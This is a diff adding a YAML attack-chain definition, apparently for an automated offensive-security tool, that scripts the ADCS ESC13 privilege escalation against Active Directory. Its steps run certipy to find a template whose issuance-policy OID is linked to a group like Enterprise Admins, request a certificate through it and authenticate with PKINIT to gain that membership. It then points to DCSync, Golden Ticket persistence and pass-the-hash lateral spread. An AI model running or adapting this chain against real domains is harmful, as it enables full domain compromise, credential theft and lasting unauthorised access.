@@ -1,0 +1,86 @@
+id: esc13-adcs-issuance-policy
+name: "ADCS ESC13 — Issuance Policy OID linked to a group"
+description: >
+  A certificate Issuance Policy OID is linked (via msDS-OIDToGroupLink)
+  to an AD group. Any cert issued under that policy gives the holder
+  group membership at authentication time — including in privileged groups
+  like Enterprise Admins.
+tags: [adcs, esc13, priv-esc, certificates, oid-mapping]
+difficulty: hard
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: user
+    source: target_context.user
+    required: true
+  - name: password
+    source: target_context.password
+    required: true
+
+steps:
+  - id: find_esc13
+    name: "Find ESC13 templates (OID-linked policies)"
+    command_ref: certipy-find
+    inputs:
+      ip: "${dc_ip}"
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+    notes: |
+      certipy-find prints `[!] Vulnerabilities: ESC13` and shows the OID
+      → group mapping. Look for groups like "Enterprise Admins",
+      "Domain Admins", "Backup Operators".
+    capture:
+      - var: vuln_template
+        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC13'
+        match: first
+      - var: ca_name
+        regex: 'CA Name\s*:\s*(.+?)$'
+        match: first
+      - var: privileged_group
+        regex: 'Issuance Policies[\s\S]*?\((CN=[^)]+)\)'
+        match: first
+
+  - id: request_cert
+    name: "Request cert via the policy-linked template"
+    command_ref: certipy-esc13
+    requires: [vuln_template, ca_name]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      ca_name: "${ca_name}"
+      vulnerable_template: "${vuln_template}"
+    capture:
+      - var: pfx_file
+        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
+        match: first
+
+  - id: pkinit_auth
+    name: "Authenticate — KDC adds the linked group to your token"
+    command_ref: certipy-auth
+    requires: [pfx_file]
+    inputs:
+      pfx_file: "${pfx_file}"
+      ip: "${dc_ip}"
+    notes: |
+      `klist tickets` / `whoami /groups` after auth show the new group
+      membership. If the linked group was EA → you can now DCSync.
+
+references:
+  - title: "ESC13 (Jonas)"
+    url:   "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
+
+next_chains:
+  - chain: ad-persistence-golden-ticket
+    when:   'privileged group obtained'
+    reason: 'Persist via Golden Ticket.'
+  - chain: pth-lateral-spread
+    when:   'NTLM hashes captured via DCSync'
+    reason: 'Spread the harvested hashes.'
